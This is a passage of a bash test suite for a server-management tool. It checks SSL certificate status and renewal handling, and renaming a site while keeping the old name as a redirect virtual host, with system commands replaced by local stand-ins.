  MSYS2_ARG_CONV_EXCL='/CN=' openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -days 60 \
    -keyout "$SSL_DEPLOY_DIR/self.test/privkey.pem" -out "$SSL_DEPLOY_DIR/self.test/fullchain.pem" \
    -subj "/CN=self.test" -addext "subjectAltName=DNS:self.test" >/dev/null 2>&1
  printf 'x\n' >"$LE_RENEWAL/self.test.conf"
  assert_has  "nor a self-signed one"                                    "FAIL|" "$(lib_ssl_lineage_check self.test self.test)"
  assert_has  "and it says which"                                        "|0|self-signed" "$(lib_ssl_lineage_check self.test self.test)"

  assert_eq   "no file anywhere is no certificate"                       "NONE||0|no certificate" "$(lib_ssl_lineage_check gone.test gone.test)"
  _sc_mk "$LE_LIVE/live.test" "Let's Encrypt" 60 live.test
  assert_has  "one certbot holds and the servers never got is a failure" "FAIL||0|issued, but never copied" "$(lib_ssl_lineage_check live.test live.test)"

  # the servers present the deployed copy: a renewal the hook could not copy is not finished
  _sc_mk "$LE_LIVE/a.test" "Let's Encrypt" 85 a.test www.a.test
  assert_has  "a newer one at certbot than at the servers is a warning"  "WARN|" "$(lib_ssl_lineage_check a.test a.test)"
  assert_has  "which says what happened"                                 "the servers still use the older copy" "$(lib_ssl_lineage_check a.test a.test)"
  cp "$SSL_DEPLOY_DIR/a.test/fullchain.pem" "$LE_LIVE/a.test/fullchain.pem"
  assert_has  "the same one at both is fine"                             "OK|" "$(lib_ssl_lineage_check a.test a.test)"

  # the days, without waiting for them
  _sc_days=""; eval 'lib_ssl_days_left() { printf "%s" "$_sc_days"; }'
  _sc_days=-3; assert_eq  "expired"                                       "FAIL|-3|0|expired 3 day(s) ago" "$(lib_ssl_lineage_check a.test a.test)"
  _sc_days=5;  assert_eq  "a week left means renewal is failing"          "FAIL|5|1|renewal is not getting through" "$(lib_ssl_lineage_check a.test a.test)"
  _sc_days=20; assert_eq  "under thirty days it has missed a run"         "WARN|20|1|renewal is overdue" "$(lib_ssl_lineage_check a.test a.test)"
  _sc_days=30; assert_has "thirty is on time"                             "OK|30|1|" "$(lib_ssl_lineage_check a.test a.test)"
  _sc_days="";  assert_eq "a file openssl cannot read"                    "FAIL||0|the certificate file cannot be read" "$(lib_ssl_lineage_check a.test a.test)"
  eval "$(sed -n '/^lib_ssl_days_left() {/,/^}/p' "$ROOT/lib/ssl.sh")"

  # ---- what runs certbot ----
  _sc_timer=0; _sc_cron=0; _sc_unit=1; _sc_start=1
  eval 'systemctl() {
    case "$*" in
      "is-active --quiet certbot.timer") (( _sc_timer )) ;;
      "is-active --quiet cron")          (( _sc_cron )) ;;
      "list-unit-files certbot.service") if (( _sc_unit )); then printf "certbot.service enabled\n"; fi ;;
      "enable --now certbot.timer")      if (( _sc_start )); then _sc_timer=1; fi ;;
      show*)                             printf "Tue 2026-10-06 03:12:00 UTC\n" ;;
      *) return 1 ;;
    esac
  }'
  eval 'lib_systemctl() { systemctl "$@"; }'
  # the real ones, whatever an earlier section left in their place
  eval "$(grep -E '^lib_service_(active|exists)\(\)' "$ROOT/lib/common.sh")"
  rm -f "$CRON_FILE"
  assert_eq   "no timer and no cron entry: nothing renews"               "" "$(lib_ssl_renewal_how)"
  _sc_timer=1
  assert_eq   "the timer"                                                "timer" "$(lib_ssl_renewal_how)"
  _sc_timer=0; lib_cron_set certbot-renew "$SSL_RENEW_CRON"
  assert_eq   "a cron entry with cron stopped renews nothing"            "" "$(lib_ssl_renewal_how)"
  _sc_cron=1
  assert_eq   "a cron entry with cron running"                           "cron" "$(lib_ssl_renewal_how)"

  lib_ssl_renewal_ensure >/dev/null 2>&1
  assert_eq   "ensure starts the timer"                                  1 "$_sc_timer"
  assert_false "and takes the cron entry away: never both"               lib_cron_has certbot-renew
  _sc_timer=0; _sc_start=0
  lib_ssl_renewal_ensure >/dev/null 2>&1
  assert_true "a timer that will not start leaves cron to do it"         lib_cron_has certbot-renew
  lib_cron_remove certbot-renew; _sc_unit=0
  lib_ssl_renewal_ensure >/dev/null 2>&1
  assert_true "and so does a machine with no timer at all"               lib_cron_has certbot-renew
  assert_has  "install sets it up through the same function"             'lib_ssl_renewal_ensure' "$(declare -f lib_ssl_install)"

  # ---- the report ----
  _sc_sites="a.test"
  eval 'lib_domains_list() { printf "%s\n" $_sc_sites; }'
  eval 'lib_domain_state_load() {
    D_WWW=0; D_SSL_WILDCARD=0
    case "$1" in
      a.test) D_SSL=1; D_SSL_WANTED=1; D_WWW=1 ;;
      b.test) D_SSL=0; D_SSL_WANTED=0 ;;
      c.test) D_SSL=0; D_SSL_WANTED=1 ;;
      d.test) D_SSL=1; D_SSL_WANTED=1 ;;
      *) return 1 ;;
    esac
  }'
  eval 'lib_mail_installed() { return 1; }'
  eval 'lib_server_mail_only() { return 1; }'
  eval 'lib_require_tools() { :; }'
  eval 'lib_require_installed() { :; }'
  eval 'lib_have() { [[ "$1" == certbot ]] || command -v "$1" >/dev/null 2>&1; }'
  printf '#!/bin/sh\n' >"$CERTBOT_DEPLOY_HOOK"; chmod +x "$CERTBOT_DEPLOY_HOOK"
  lib_cron_remove certbot-renew; _sc_timer=1; _sc_unit=1

  assert_eq   "every site covered and the timer running: status 0"       0 "$(run_isolated _sc_tee lib_ssl_status_main)"
  _o="$(cat "$_sc/out")"
  assert_has  "the site is listed"                                       "a.test" "$_o"
  assert_has  "what runs certbot is named"                               "certbot.timer" "$_o"
  assert_has  "with its next run"                                        "next run Tue 2026-10-06" "$_o"
  assert_has  "and Cloudflare may go strict"                             "Full (strict) is safe" "$_o"
  assert_has  "the rehearsal is offered"                                 "ssl test" "$_o"
  assert_lacks "and nothing is said to be missing"                       "renew-ssl --missing" "$_o"

  # seventeen sites and not one certificate is not "every certificate is valid"
  _sc_sites="b.test"
  assert_eq   "no certificate anywhere is still no failure"              0 "$(run_isolated _sc_tee lib_ssl_status_main)"
  _o="$(cat "$_sc/out")"
  assert_lacks "but it is not called valid"                              "every certificate is valid" "$_o"
  assert_has  "it is called what it is"                                  "no certificate on this server yet" "$_o"
  assert_has  "with the way to get them all"                             "renew-ssl --missing" "$_o"
  assert_lacks "and no rehearsal of nothing"                             "ssl test" "$_o"

  _sc_sites="a.test b.test"
  assert_eq   "a site that never asked for one is no failure"            0 "$(run_isolated _sc_tee lib_ssl_status_main)"
  _o="$(cat "$_sc/out")"
  assert_has  "but it is said to answer on HTTP only"                    "not requested" "$_o"
  assert_has  "and it keeps Cloudflare off strict"                       "1 of 2 site(s) would answer 526" "$_o"
  assert_lacks "which is then not called safe"                           "is safe" "$_o"

  _sc_sites="a.test c.test"
  assert_eq   "a site that asked and got none is a failure"              1 "$(run_isolated _sc_tee lib_ssl_status_main)"
  assert_has  "with the command that gets it one"                        "renew-ssl c.test" "$(cat "$_sc/out")"

  _sc_sites="a.test d.test"
  assert_eq   "SSL on in the state and no file is a failure"             1 "$(run_isolated _sc_tee lib_ssl_status_main)"
  assert_has  "named with its fix"                                       "renew-ssl d.test" "$(cat "$_sc/out")"

  _sc_sites="a.test"; _sc_timer=0
  assert_eq   "valid certificates that nothing renews: a failure"        1 "$(run_isolated _sc_tee lib_ssl_status_main)"
  _o="$(cat "$_sc/out")"
  assert_has  "it says nothing runs certbot"                             "no active certbot.timer and no cron entry" "$_o"
  assert_has  "how to switch it on"                                      "ssl fix" "$_o"
  assert_has  "and not to go strict yet"                                 "nothing renews them" "$_o"
  _sc_timer=1; rm -f "$CERTBOT_DEPLOY_HOOK"
  assert_eq   "no deploy hook: a failure too"                            1 "$(run_isolated _sc_tee lib_ssl_status_main)"
  assert_has  "a renewed certificate would never arrive"                 "would never reach the servers" "$(cat "$_sc/out")"
  assert_eq   "an argument it does not know is refused"                  1 "$(run_isolated _sc_tee lib_ssl_main status --all)"
  assert_eq   "and so is a subcommand"                                   1 "$(run_isolated _sc_tee lib_ssl_main renew)"
fi

# ---- a certificate for every site that has none ----
_sc_state="$STATE_DIR"; STATE_DIR="$_sc/state"
_sc_script="$SCRIPT_PATH"; SCRIPT_PATH="$_sc/child.sh"
# the child every site is handed to: it records its arguments and fails for bad.test
{
  printf '%s\n' '#!/usr/bin/env bash'
  printf 'printf "%%s\\n" "$*" >>"%s"\n' "$_sc/child.log"
  printf '%s\n' '[[ "$2" != bad.test ]]'
} >"$SCRIPT_PATH"
chmod +x "$SCRIPT_PATH"
eval 'lib_domains_list() { printf "%s\n" has.test asked.test never.test bad.test; }'
eval 'lib_require_tools() { :; }'; eval 'lib_require_installed() { :; }'; eval 'lib_notify_send() { :; }'
for _d in has.test asked.test never.test bad.test; do mkdir -p "$(dirname "$(lib_domain_json "$_d")")"; done
printf '{"ssl":{"enabled":true,"wanted":true}}\n'   >"$(lib_domain_json has.test)"
printf '{"ssl":{"enabled":false,"wanted":true}}\n'  >"$(lib_domain_json asked.test)"
printf '{"ssl":{"enabled":false,"wanted":false}}\n' >"$(lib_domain_json never.test)"
printf '{"ssl":{"enabled":false,"wanted":false}}\n' >"$(lib_domain_json bad.test)"
: >"$_sc/child.log"
assert_eq   "one that fails makes the whole run fail"                  1 "$(run_isolated _sc_tee lib_ssl_renew_main --missing)"
_o="$(cat "$_sc/child.log")"
assert_lacks "a site that has one is left alone"                       "has.test" "$_o"
assert_has  "one that asked and got none is tried"                     "renew-ssl asked.test --yes" "$_o"
assert_has  "and so is one that never asked"                           "renew-ssl never.test --yes" "$_o"
assert_has  "the failure did not stop the run before the last"         "renew-ssl bad.test --yes" "$_o"
assert_lacks "nothing is forced"                                       "--force" "$_o"
assert_has  "the one that failed is named"                             "failed for: bad.test" "$(cat "$_sc/out")"
assert_has  "and how many are done"                                    "the 2 of 3 that got one are done" "$(cat "$_sc/out")"
: >"$_sc/child.log"
assert_eq   "--all still passes over the ones that never asked"        0 "$(run_isolated _sc_tee lib_ssl_renew_main --all)"
assert_eq   "and renews the ones that did"                             "renew-ssl has.test --yes
renew-ssl asked.test --yes" "$(cat "$_sc/child.log")"
assert_eq   "--missing with a domain is refused"                       1 "$(run_isolated _sc_tee lib_ssl_renew_main --missing has.test)"
for _d in asked.test never.test bad.test; do printf '{"ssl":{"enabled":true}}\n' >"$(lib_domain_json "$_d")"; done
: >"$_sc/child.log"
assert_eq   "nothing missing is no failure"                            0 "$(run_isolated _sc_tee lib_ssl_renew_main --missing)"
assert_eq   "and nothing is asked for"                                 "" "$(cat "$_sc/child.log")"
STATE_DIR="$_sc_state"; SCRIPT_PATH="$_sc_script"

# ---- reaching it ----
_body="$(awk '/^_menu_certificates\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/menu.sh")"
assert_has  "the certificates menu starts with the check"              '1) _menu_run ssl status ;;' "$_body"
assert_has  "the rehearsal is in it"                                   '_menu_run ssl test ;;' "$_body"
assert_has  "and so is switching renewal back on"                      '_menu_run ssl fix ;;' "$_body"
assert_has  "and a certificate for every site that has none"           '_menu_run renew-ssl --missing ;;' "$_body"
assert_has  "a mail-only server reaches the check from its own menu"   '11) _menu_run ssl status ;;' "$(awk '/^_menu_mail_server\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/menu.sh")"
assert_has  "the command is dispatched"                                'lib_ssl_main "${rest[@]}" || exit 1' "$(cat "$ROOT/setup.sh")"
assert_has  "only fix takes the lock"                                  'ssl)    case "${rest[0]:-status}" in fix) lib_lock ;;' "$(cat "$ROOT/setup.sh")"
assert_has  "and it is in the command reference"                       "ssl [status]" "$(lib_usage)"

eval "$_sc_saved_vars"; eval "$_sc_saved_fn"
unset -f _sc_mk _sc_tee
# =============================================================================
section "rename: a site under another name, and the old name as a redirect"
# A site is its name: the home, the Linux user, the log directory, the state directory, the
# virtual host and the certificate are all called after it. "rename" moves every one of them
# and leaves the old name behind as a redirect - a record that is no site, so that nothing
# which walks the sites meets it, and that still keeps the name from being given away twice.
#
# Each case loads the modules afresh over a tree of its own, so nothing an earlier section
# stood in for is still standing in here; what reaches outside the process is stood in for
# below, and what decides, moves and writes is real.
_rn="$TMP/rename"
_rn_mods="common system ols php db ssl domain harden scan proxy app mail webmail cloudflare backup monitor install rename menu"
_rn_stubs='
  HARDEN_PHP_INI_ROOT="$_rn/phpini"; LE_LIVE="$_rn/le"; WPCLI_BIN="$_rn/wp"; MAIL_DOMAINS_DIR="$_rn/maildomains"
  MAIL_PASSWD_FILE="$_rn/mail/passwd"; MAIL_ALIAS_DIR="$_rn/mail/aliases"; MAIL_VMAIL_HOME="$_rn/vmail"; MAIL_DISABLED_DIR="$_rn/mail/disabled"
  lib_mail_enable_main() {
    printf "mail-enable %s\n" "$*" >>"$_rn/calls"
    if [[ -e "$_rn/mail-enable-fails" ]]; then lib_die "The DKIM key could not be created"; fi
    lib_json_set "$(lib_mail_json "$1")" ".mail.enabled = true"
  }
  lib_mail_tables_apply() { printf "mail-tables %s\n" "$(lib_mail_boxes | tr "\n" " ")" >>"$_rn/calls"; }
  doveadm() { printf "doveadm %s\n" "$*" >>"$_rn/calls"; }
  lib_webmail_domain_enable() { printf "webmail-enable %s\n" "$1" >>"$_rn/calls"; }
  _wm_info_load() { [[ -e "$_rn/wm-users" ]] && WM_DB_NAME=wm; }
  _wm_users() { grep -xF -- "${1,,}" "$_rn/wm-users" 2>/dev/null || true; }
  lib_db_sql() { printf "sql %s\n" "$1" >>"$_rn/calls"; }
  lib_require_tools() { :; }; lib_require_installed() { :; }; lib_system_profile() { :; }
  lib_ols_is_installed() { return 0; }
  lib_ols_change_begin() { OLS_PENDING_RELOAD=0; }
  lib_ols_change_commit() { printf "commit pending=%s %s\n" "$OLS_PENDING_RELOAD" "$*" >>"$_rn/calls"; OLS_PENDING_RELOAD=0; }
  lib_mail_installed() { [[ -e "$_rn/mail-installed" ]]; }
  lib_mail_domain_has_traces() { [[ -e "$_rn/mail-traces-$1" ]]; }
  lib_ssl_dns_check() { SSL_LAST_ERROR="no A record"; return "$(cat "$_rn/dns-rc" 2>/dev/null || printf 0)"; }
  lib_ssl_obtain_names() { printf "obtain %s\n" "$*" >>"$_rn/calls"; SSL_LAST_ERROR="certbot said no"; [[ -e "$_rn/certbot-works" ]] || return 1; mkdir -p "$SSL_DEPLOY_DIR/$1"; printf c >"$SSL_DEPLOY_DIR/$1/fullchain.pem"; printf k >"$SSL_DEPLOY_DIR/$1/privkey.pem"; }
  lib_ssl_cert_covers() { local c="$1" n=""; shift; for n in "$@"; do grep -qxF -- "$n" "$_rn/covers-$c" 2>/dev/null || return 1; done; }
  lib_ssl_status_line() { printf "60 days"; }
  lib_ssl_delete() { printf "ssl-delete %s\n" "$1" >>"$_rn/calls"; rm -rf "${SSL_DEPLOY_DIR:?}/$1"; }
  lib_ols_smoke_test() { printf "smoke %s\n" "$*" >>"$_rn/calls"; OLS_TEST_OUTPUT="HTTP 500"; [[ ! -e "$_rn/smoke-fails" ]]; }
  lib_manifest_set() { :; }
  lib_php_cli() { printf "/php"; }
  lib_domain_wpcli_ensure() { :; }
  certbot() { return 1; }; systemctl() { return 1; }
  chown() { return 0; }; setfacl() { :; }
  runuser() { printf "%s\n" "$*" >>"$_rn/runuser.log"; [[ "${1:-}" == "-u" && -n "${2:-}" && "${3:-}" == "--" ]] || return 1; shift 3; "$@"; }
  pkill() { return 0; }; pgrep() { return 1; }; sleep() { :; }
  # the account database: who there is ($_rn/users, $_rn/groups) and where each account lives
  # ($_rn/passwd, "user:home"), which the stand-in for usermod keeps up to date
  id() { if [[ "${1:-}" == "-u" ]]; then grep -qxF -- "${2:-}" "$_rn/users"; else command id "$@"; fi; }
  getent() {
    local h=""
    case "${1:-}" in
      group)  grep -qxF -- "${2:-}" "$_rn/groups" ;;
      passwd) h="$(awk -F: -v u="${2:-}" "\$1 == u { print \$2 }" "$_rn/passwd" 2>/dev/null | tail -n 1)"
              [[ -n "$h" ]] || return 2
              printf "%s:x:1001:1001:site:%s:/usr/sbin/nologin\n" "$2" "$h" ;;
      *)      return 2 ;;
    esac
  }
  usermod() {
    printf "usermod %s\n" "$*" >>"$_rn/calls"
    if [[ -e "$_rn/usermod-d-fails" && " $* " == *" -d "* ]]; then return 1; fi
    if [[ "$1" == "-l" ]]; then sed -i "s/^$3\$/$2/" "$_rn/users"; sed -i "s/^$3:/$2:/" "$_rn/passwd"; fi
    if [[ "$1" == "-d" ]]; then sed -i "s|^${*: -1}:.*|${*: -1}:$2|" "$_rn/passwd"; fi
    return 0
  }
  groupmod() { printf "groupmod %s\n" "$*" >>"$_rn/calls"; if [[ "$1" == "-n" ]]; then sed -i "s/^$3\$/$2/" "$_rn/groups"; fi; return 0; }
  # the two listeners a server has, and its catch-all virtual host
  _rn_conf() {
    [[ ! -f "$LSWS_CONF" ]] || return 0
    printf "listener %s {\n  address                 *:80\n  secure                  0\n  map                     %s *\n}\n\nlistener %s {\n  address                 *:443\n  secure                  1\n  map                     %s *\n}\n" \
      "$OLS_LISTENER_HTTP" "$OLS_DEFAULT_VHOST" "$OLS_LISTENER_HTTPS" "$OLS_DEFAULT_VHOST" >"$LSWS_CONF"
  }
  # what "rename" calls of the rest of lomp: a record of the call, and the trace it leaves
  _rn_flow() {
    lib_backup_domain() {
      printf "backup %s\n" "$*" >>"$_rn/calls"
      if [[ -e "$_rn/backup-fails" ]]; then BK_ERROR="disk full"; return 1; fi
      BK_LAST_FILE="$BACKUP_ROOT/$1/$1-pre-rename-20260101-000000.tar.gz"; : >"$BK_LAST_FILE"
    }
    lib_ols_vhost_purge() { printf "purge %s\n" "$*" >>"$_rn/calls"; rm -rf "${LSWS_VHOSTS_DIR:?}/$1"; }
    # a configuration OpenLiteSpeed rejects: the snapshot that is put back has no block for the
    # new name, and the directory its vhconf was written into is still there
    lib_ols_conf_block_exists() { [[ -d "$LSWS_VHOSTS_DIR/$2" && ! -e "$_rn/apply-fails" ]]; }
    lib_domain_apply_config() {
      printf "apply %s user=%s home=%s ssl=%s\n" "$D_DOMAIN" "$D_USER" "$D_HOME" "$D_SSL" >>"$_rn/calls"; mkdir -p "$LSWS_VHOSTS_DIR/$D_DOMAIN"
      if [[ -e "$_rn/apply-fails" && "$D_DOMAIN" == beta.example ]]; then lib_die "OpenLiteSpeed configuration test failed"; fi
    }
    lib_domain_php_probe() { [[ ! -e "$_rn/php-fails" ]]; }
    lib_domain_add_ssl() { printf "add-ssl %s\n" "$D_DOMAIN" >>"$_rn/calls"; }
    lib_redirect_apply() { printf "redirect-apply %s\n" "$*" >>"$_rn/calls"; [[ ! -e "$_rn/redirect-fails" ]]; }
    lib_domain_logs_link() { printf "logs-link %s\n" "$D_HOME" >>"$_rn/calls"; }
    lib_domain_logrotate_regen() { printf "logrotate\n" >>"$_rn/calls"; }
    lib_domain_fail2ban_regen() { :; }
    lib_ols_htaccess_watch_ensure() { :; }
    _app_site_lock() { printf "app-lock %s\n" "$1" >>"$_rn/calls"; }
    lib_app_teardown() { printf "app-teardown %s\n" "$D_IDENT" >>"$_rn/calls"; }
    lib_app_restore() { printf "app-restore %s home=%s\n" "$D_IDENT" "$D_HOME" >>"$_rn/calls"; [[ ! -e "$_rn/app-fails" ]]; }
    lib_app_apply() { printf "app-apply %s\n" "$D_IDENT" >>"$_rn/calls"; }
    _app_jobs_sync() { printf "app-jobs %s\n" "$D_DOMAIN" >>"$_rn/calls"; }
  }
  _rn_rename() { _rn_flow; lib_domain_rename_main "$@"; }
  _rn_rename_asked() { OPT_YES=0; _rn_flow; lib_domain_rename_main "$@"; }
  _rn_rename_dry() { OPT_DRY_RUN=1; _rn_flow; lib_domain_rename_main "$@"; }
  # the same in Turkish: the fresh modules put the lib_tr that changes nothing back, so the
  # language module is loaded after them
  _rn_tr() { source "$ROOT/lib/lang.sh"; LIB_LANG="tr"; lib_lang_build; }
  _rn_rename_tr() { _rn_tr; _rn_flow; lib_domain_rename_main "$@"; }
  _rn_redirect_tr() { _rn_tr; _rn_conf; lib_redirect_main "$@"; }
  _rn_say_tr() { _rn_tr; lib_tr "$1"; printf "%s" "$LIB_TR"; }
  _rn_usage_tr() { _rn_tr; lib_domain_rename_usage; lib_redirect_usage; }
  _rn_usage_en() { lib_domain_rename_usage; lib_redirect_usage; }
  _rn_list_tr() { _rn_tr; lib_domain_list_main; }
  _rn_harden_tr() { _rn_tr; lib_sitefw_enabled() { return 0; }; lib_sitefw_loaded() { return 1; }; lib_harden_status; }
  _rn_rlist_tr() { _rn_tr; lib_redirect_list; }
  _rn_blocker() { lib_domain_state_load "$1"; _domain_rename_blocker "$1" "$2"; }
  _rn_redirect() { _rn_conf; lib_redirect_main "$@"; }
  _rn_vhconf() { lib_redirect_load "$1"; lib_redirect_render_vhconf; }
  _rn_sync() { _rn_conf; lib_redirect_sync_target "$1"; }
  _rn_ssl() {
    lib_ssl_lineage_check() { printf "%s\n" "$*" >>"$_rn/calls"; cat "$_rn/lineage" 2>/dev/null || printf "NONE||0|no certificate"; printf "\n"; }
    lib_have() { return 1; }
    lib_ssl_status_main
  }
  _rn_quiet() {
    pkill() { printf "pkill %s\n" "$*" >>"$_rn/calls"; }
    pgrep() { local n=0; n="$(cat "$_rn/running" 2>/dev/null || printf 0)"; (( n > 0 )) || return 1; printf "%s" "$((n - 1))" >"$_rn/running"; return 0; }
    _domain_rename_quiet_user "$1"
  }
  _rn_doctor() {
    _doc_add() { printf "%s|%s|%s\n" "$1" "$2" "$3"; }
    lib_ols_conf_vhosts() { printf "%s\n" _default alpha.example old.example stray.example; }
    lib_ols_conf_block_exists() { [[ "$2" != gone.example ]]; }
    lib_ols_conf_map_get() { printf "x"; }
    lib_http_code() { cat "$_rn/http-code" 2>/dev/null || printf 301; }
    lib_php_installed_versions() { :; }
    lib_domains_list() { :; }
    _doc_check_domains
  }
'
_rn_case() {   # command... -> $_rn/out, with its exit status as the last line
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  (
    trap - EXIT
    STATE_DIR="$_rn/state"; SITES_ROOT="$_rn/home"; SITES_LOG_ROOT="$_rn/sitelogs"; LSWS_HOME="$_rn/lsws"; LOG_FILE="$_rn/log"
    BACKUP_ROOT="$_rn/backups"; SSL_DEPLOY_DIR="$_rn/ssl"; CRON_FILE="$_rn/cron"; ACME_ROOT="$_rn/acme"
    OPT_QUIET=0; OPT_YES=1; OPT_DRY_RUN=0; OPT_NON_INTERACTIVE=1
    for _m in $_rn_mods; do
      # shellcheck source=/dev/null
      source "$ROOT/lib/$_m.sh"
    done
    trap - EXIT
    eval "$_rn_stubs"
    set -Eeuo pipefail; shopt -s lastpipe
    "$@"
  ) >"$_rn/out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf 'rc=%s\n' "$rc" >>"$_rn/out"
}
_rn_out()   { cat "$_rn/out"; }
_rn_calls() { cat "$_rn/calls" 2>/dev/null || true; }
_rn_site() {   # domain ident [mode]
  local d="$1" i="$2"
  mkdir -p "$_rn/state/domains/$d" "$_rn/home/$d/public_html" "$_rn/home/$d/private" "$_rn/sitelogs/$d" "$_rn/backups/$d" "$_rn/phpini/$d" "$_rn/ssl/$d" "$_rn/lsws/conf/vhosts/$d"
  jq -n --arg d "$d" --arg i "$i" --arg h "$_rn/home/$d" --arg m "${3:-php}" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:$m, php:{version:"8.3", children:"4", memory_limit:"256M", upload_max:"64M"},
      www:true, www_primary:false, ssl:{enabled:true, wanted:true, expires:"soon", cert_name:$d}, email:"a@b.example",
      status:"active", db:{name:"alpha_db", user:"alpha_user"}, backup:{last:"yesterday", last_file:"/x"}, security:{php_exec:"blocked"}}' \
    >"$_rn/state/domains/$d/domain.json"
  printf 'DB_NAME=alpha_db\nDB_USER=alpha_user\nDB_PASS=secret\n' >"$_rn/state/domains/$d/db.info"
  printf 'CERT_NAME=%s\n' "$d" >"$_rn/state/domains/$d/ssl.info"
  printf 'c' >"$_rn/ssl/$d/fullchain.pem"; printf 'k' >"$_rn/ssl/$d/privkey.pem"
  printf '%s\nwww.%s\n' "$d" "$d" >"$_rn/covers-$d"
  printf '<?php // the site\n' >"$_rn/home/$d/public_html/index.php"
  printf 'line\n' >"$_rn/sitelogs/$d/access.log"
  printf 'archive\n' >"$_rn/backups/$d/$d-20260101-000000.tar.gz"
  printf 'ini\n' >"$_rn/phpini/$d/90-lomp.ini"
  printf '%s\n' "$i" >>"$_rn/users"; printf '%s\n' "$i" >>"$_rn/groups"; printf '%s:%s\n' "$i" "$_rn/home/$d" >>"$_rn/passwd"
}
_rn_fresh() {
  rm -rf "$_rn"; mkdir -p "$_rn/state/domains" "$_rn/home" "$_rn/sitelogs" "$_rn/lsws/conf/vhosts" "$_rn/lsws/_default/html" "$_rn/backups" "$_rn/ssl" "$_rn/phpini"
  : >"$_rn/calls"; : >"$_rn/log"; printf 'root\n' >"$_rn/users"; printf 'root\n' >"$_rn/groups"; : >"$_rn/passwd"
  printf '#!/bin/sh\nprintf "wp %%s\\n" "$*" >>"%s/calls"\n' "$_rn" >"$_rn/wp"; chmod +x "$_rn/wp"
  _rn_site alpha.example alpha_example
  printf '%s\n' "*/5 * * * * alpha_example cd $_rn/home/alpha.example/public_html && wp cron # server-setup:wpcron:alpha.example" >"$_rn/cron"
}
_rn_tree() { ( cd "$_rn" && find state/domains home sitelogs phpini ssl -mindepth 1 -maxdepth 2 | sort ); }
_rn_json() { jq -r "$2" "$_rn/state/domains/$1/domain.json" 2>/dev/null || true; }

# ---- a redirect is a record, and no site -------------------------------------------
_rn_fresh
_rn_case lib_redirect_save old.example alpha.example 1
assert_has   "a redirect is saved" "rc=0" "$(_rn_out)"
assert_eq    "with where it leads and whether www comes along" "redirect alpha.example true" "$(jq -r '"\(.kind) \(.target) \(.www)"' "$_rn/state/domains/old.example/redirect.json")"
assert_false "no domain.json is made beside it" test -e "$_rn/state/domains/old.example/domain.json"
_rn_case lib_redirect_exists old.example;        assert_has "it exists"                        "rc=0" "$(_rn_out)"
_rn_case lib_redirect_exists alpha.example;      assert_has "a site is no redirect"            "rc=1" "$(_rn_out)"
_rn_case lib_redirect_exists ../domains/old.example; assert_has "a path is no redirect either" "rc=1" "$(_rn_out)"
_rn_case lib_domain_registered old.example;      assert_has "and a redirect is no site"        "rc=1" "$(_rn_out)"
_rn_case lib_domains_list;                       assert_eq  "the sites are listed without it"  "alpha.example rc=0" "$(_rn_out | tr '\n' ' ' | sed 's/ $//')"
_rn_case lib_redirects_list;                     assert_eq  "the redirects without the site"   "old.example rc=0" "$(_rn_out | tr '\n' ' ' | sed 's/ $//')"
_rn_case lib_redirect_save other.example elsewhere.example 0
_rn_case lib_redirects_to alpha.example;         assert_eq  "the redirects that lead to a name" "old.example rc=0" "$(_rn_out | tr '\n' ' ' | sed 's/ $//')"
_rn_case lib_redirect_load nosuch.example;       assert_has "one that is not there does not load" "rc=1" "$(_rn_out)"

# ---- where it sends its visitors -----------------------------------------------------
_rn_case lib_redirect_target_url alpha.example;     assert_eq  "a site with a certificate: https" "https://alpha.examplerc=0" "$(_rn_out)"
jq '.ssl.enabled = false' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case lib_redirect_target_url alpha.example;     assert_eq  "a site without one: http" "http://alpha.examplerc=0" "$(_rn_out)"
jq '.ssl.enabled = true | .www_primary = true' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case lib_redirect_target_url alpha.example;     assert_eq  "a site whose main name is www" "https://www.alpha.examplerc=0" "$(_rn_out)"
_rn_case lib_redirect_target_url elsewhere.example; assert_eq  "a name that is no site here: https" "https://elsewhere.examplerc=0" "$(_rn_out)"

# ---- the virtual host -----------------------------------------------------------------
_rn_fresh
_rn_case lib_redirect_save old.example alpha.example 1
_rn_case _rn_vhconf old.example
_o="$(_rn_out)"
assert_has   "everything goes on with a 301, path kept" 'RewriteRule ^(.*)$ https://alpha.example$1 [R=301,L]' "$_o"
assert_has   "but the ACME challenge, which renews its certificate" 'RewriteCond %{REQUEST_URI} !^/\.well-known/acme-challenge/' "$_o"
assert_true  "the exception comes before the rule" bash -c 'a="$(grep -n "acme-challenge/$" "$1" | tail -n 1 | cut -d: -f1)"; b="$(grep -n "R=301" "$1" | cut -d: -f1)"; [ "$a" -lt "$b" ]' _ "$_rn/out"
assert_has   "the challenge directory is served" "location                $_rn/acme/.well-known/acme-challenge/" "$_o"
assert_has   "www comes along" "vhAliases                 www.old.example" "$_o"
assert_lacks "no certificate, no vhssl" "vhssl" "$_o"
assert_lacks "no script handler: it runs nothing" "scripthandler" "$_o"
mkdir -p "$_rn/ssl/old.example"; printf c >"$_rn/ssl/old.example/fullchain.pem"; printf k >"$_rn/ssl/old.example/privkey.pem"
_rn_case lib_redirect_save old.example alpha.example 0
_rn_case _rn_vhconf old.example
_o="$(_rn_out)"
assert_has   "with its certificate deployed it answers HTTPS" "keyFile                 $_rn/ssl/old.example/privkey.pem" "$_o"
assert_lacks "without --www no alias" "vhAliases" "$_o"

_rn_case _rn_redirect add old.example alpha.example --www --no-ssl
_o="$(_rn_out)"; _c="$(cat "$_rn/lsws/conf/httpd_config.conf")"
assert_has "redirect add succeeds" "rc=0" "$_o"
assert_has "its virtual host is in the configuration" "virtualhost old.example {" "$_c"
assert_has "rooted where no site's files are" "vhRoot                  $_rn/lsws/_default/" "$_c"
assert_has "and runs no script" "enableScript            0" "$_c"
assert_eq  "both listeners map the name and www to it" 2 "$(grep -c 'map                     old.example old.example, www.old.example' <<<"$_c")"
assert_true "its vhconf is written" test -s "$_rn/lsws/conf/vhosts/old.example/vhconf.conf"
assert_has "one change set, reloaded" "commit pending=1 redirect old.example -> alpha.example" "$(_rn_calls)"
